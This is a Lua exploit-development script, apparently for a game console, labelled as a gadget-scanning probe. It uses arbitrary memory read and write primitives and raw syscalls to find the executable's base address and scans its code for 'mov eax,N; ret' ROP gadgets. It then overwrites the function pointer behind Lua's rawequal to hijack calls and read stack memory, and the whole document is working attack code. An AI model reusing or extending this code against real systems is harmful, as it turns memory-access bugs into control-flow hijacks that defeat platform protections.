-- CRASH_CLASS: LOW
-- PROBE 56d6: Wide eboot scan for mov eax,N;ret (rax=2..10)
--
-- 56d5 found zero rax>=2 gadgets in 128KB around Lua funcs.
-- This probe scans 1.5MB of eboot .text (0x80000..0x200000) for
-- B8 XX 00 00 00 C3 where XX=2..10.
-- If found, tests rax=2,3 on rawequal() to read below the call frame.

print("=== PROBE 56d6: WIDE GADGET SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    if type(v) == "string" then return '"' .. tostring(v):sub(1,40) .. '"' end
    if type(v) == "boolean" then return tostring(v) end
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    if type(v) == "number" then return string.format("%g", v) end
    return type(v) .. ":" .. tostring(v)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local tlo = rd(N(info) + 0x108) or 0
local thi = rd(N(info) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

-- ============ SCAN ============
-- Scan 1.5MB: 0x80000 to 0x200000
-- Read dwords, extract bytes, check B8 XX 00 00 00 C3

local gadgets = {}
gadgets[0] = 0x471
gadgets[1] = 0x1AB0C6

local START = 0x80000
local STOP  = 0x200000
local CHUNK = 0x4000  -- 16KB

print(string.format("[1] Scanning eboot+0x%X..+0x%X (%dKB)", START, STOP, (STOP - START) / 1024))

local found_count = 0
for cs = START, STOP - CHUNK, CHUNK do
    local dwords = {}
    local count = CHUNK / 4
    for i = 0, count - 1 do
        dwords[i] = rd(tlo + cs + i * 4) or 0
    end

    for i = 0, count - 2 do
        local d0 = dwords[i]
        local d1 = dwords[i + 1]

        -- Extract 8 bytes from adjacent dwords
        local b0 = d0 % 256
        local b1 = math.floor(d0 / 256) % 256
        local b2 = math.floor(d0 / 65536) % 256
        local b3 = math.floor(d0 / 16777216) % 256
        local b4 = d1 % 256
        local b5 = math.floor(d1 / 256) % 256

        -- Check offsets 0,1,2 within the 8-byte window
        -- B8 XX 00 00 00 C3
        for s = 0, 2 do
            local bb = {b0, b1, b2, b3, b4, b5}
            if bb[s+1] == 0xB8 and bb[s+3] == 0 and bb[s+4] == 0
               and bb[s+5] == 0 and bb[s+6] == 0xC3 then
                local val = bb[s+2]
                if val >= 2 and val <= 20 and not gadgets[val] then
                    gadgets[val] = cs + i * 4 + s
                    print(string.format("  *** rax=%d at eboot+0x%X ***", val, gadgets[val]))
                    found_count = found_count + 1
                end
            end
        end
    end

    dwords = nil
    collectgarbage("collect")

    -- Progress every 256KB
    if (cs - START) % 0x40000 == 0 and cs > START then
        print(string.format("  ... scanned to +0x%X", cs + CHUNK))
    end
end

-- ============ INVENTORY ============
print("")
print("[2] Gadget inventory")
for val = 0, 10 do
    if gadgets[val] then
        print(string.format("  rax=%d → eboot+0x%X", val, gadgets[val]))
    end
end

if found_count == 0 then
    print("  No rax>=2 gadgets in scanned range!")
end

-- ============ TESTS ============
local re_s = tostring(rawequal)
local re_a_str = re_s:match("0x([0-9a-fA-F]+)") or re_s:match(": ([0-9a-fA-F]+)$") or re_s:match(": (%d+)$")
local re_a = tonumber(re_a_str, 16) or tonumber(re_a_str)

local function redir_test(nret, args_str, call_fn)
    if not gadgets[nret] or not alive() then return end
    local saved = rq(re_a + 0x20)
    pcall(function() memory.write_qword(re_a + 0x20, eaddr(gadgets[nret])) end)
    local r = {pcall(call_fn)}
    pcall(function() memory.write_qword(re_a + 0x20, saved) end)

    local ok = r[1]
    local parts = {}
    for i = 2, math.min(#r, 12) do
        parts[#parts + 1] = fmt(r[i])
    end
    print(string.format("  rax=%d %s: ok=%s n=%d [%s]",
        nret, args_str, tostring(ok), #r - 1, table.concat(parts, " | ")))
end

if found_count > 0 and alive() then
    print("")
    print("[3] Deep stack reads")

    -- With 2 args: rax=2 reads both args, rax=3 reads func+both args, rax=4 reads below
    for nret = 2, 5 do
        redir_test(nret, "re(111,222)", function() return rawequal(111, 222) end)
    end

    print("")
    print("[4] Zero-arg deep reads")
    for nret = 2, 5 do
        redir_test(nret, "re()", function() return rawequal() end)
    end

    print("")
    print("[5] String arg deep reads")
    for nret = 2, 4 do
        redir_test(nret, "re('A','B')", function() return rawequal("A", "B") end)
    end
end

print("")
print("[F] Stability")
if alive() then
    print(string.format("  rawequal(1,1)=%s (1,2)=%s", tostring(rawequal(1,1)), tostring(rawequal(1,2))))
end
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56d6 COMPLETE ===")
